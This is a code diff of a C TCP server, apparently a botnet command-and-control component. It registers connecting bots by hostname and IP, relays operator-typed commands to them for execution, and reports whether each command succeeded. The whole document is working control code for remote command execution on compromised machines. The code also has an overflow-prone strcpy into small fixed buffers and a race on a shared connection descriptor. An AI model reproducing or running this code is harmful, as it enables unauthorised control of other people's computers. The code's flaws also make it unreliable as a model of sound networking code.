@@ -11,53 +11,71 @@
 #define PORT 9999
 #define SA struct sockaddr
 
+//We require a mutex to ask the user for input
+//Mutex declared globally so that all threads can access
 pthread_mutex_t lock;
 
-// Function designed for chat between client and server.
+//Target of the pthread_create function
 void* socketThread( void* connfd)
 {
     func(*((int*)connfd));
 	pthread_exit(NULL);
     return NULL;
 }
+
+//The function which runs the communication
 void func(int sockfd)
 {
 	char buff[MAX], hostname[20], ip[15];
 	int n;
+	//Accept the hostname from the bot
 	bzero(buff, MAX);
 	read(sockfd, buff, sizeof(buff));
-	//printf("From client: %s\t To client : ", buff);
 	strcpy(hostname, buff);
+
+	//Accept the IP from the bot
 	bzero(buff, MAX);
 	read(sockfd, buff, sizeof(buff));
 	strcpy(ip,buff);
 	for (;;) 
 	{
-		
+		//Need to ensure that only one bot reads from STDIN
+		//So we lock the mutex
         pthread_mutex_lock(&lock);
         printf("Command for (hostname: %s,ip address: %s, socket identifier: %d): ", hostname, ip, sockfd);
 		bzero(buff, MAX);
 		n = 0;
-		// copy server message in the buffer
 		while ((buff[n++] = getchar()) != '\n')
 			;
 
-		// and send that buffer to client
+		
+		//Send the command to the bot to get executed
 		write(sockfd, buff, sizeof(buff));
-        printf("Command executed\n", sockfd);
 
-		// if msg contains "Exit" then server exit and chat ended.
-		if (strncmp("exit", buff, 4) == 0) {
+		//If the command was exit, exit the loop	
+		if (strncmp("exit", buff, 4) == 0) 
+		{
 			printf("Server Exit...\n");
 			break;
 		}
+
+		//Read the execution status sent by the bot
+		bzero(buff,sizeof(buff));
+		read(sockfd,buff,sizeof(buff));
+		if(strcmp(buff,"Success") == 0)
+        	printf("Command executed\n");
+		else
+			printf("Command Failure\n");
+
+		//After reading from STDIN, we release the mutex
         pthread_mutex_unlock(&lock);
+
 		sleep(1);
 	}
+	//Need to release before exit
 	pthread_mutex_unlock(&lock);
 }
 
-// Driver function
 int main()
 {
 	int sockfd, connfd, len;
@@ -101,9 +119,10 @@ int main()
     pthread_t thread[50];
     pthread_mutex_init(&lock, NULL);
     int i=0;
-	// Accept the data packet from client and verification
+	//Wait for connections to the socket
 	while(1)
     {
+		//Accepts a connection when a client connects
         connfd = accept(sockfd, (SA*)&cli, &len);
         if (connfd < 0) {
         
@@ -113,18 +132,15 @@ int main()
         
         else
         {
+			//Create a new thread to service the client
+			//Continue listening for connections on the main thread
             if(pthread_create(&thread[i++], NULL, socketThread, &connfd) != 0)
             {
                 printf("Failed to create thread\n");
-            }
-            /*else
-            {
-                pthread_join(thread, NULL);
-            } */     
+            }   
         }      
 
 
-        // Function for chatting between client and server
     }
 	// After chatting close the socket
 	close(sockfd);
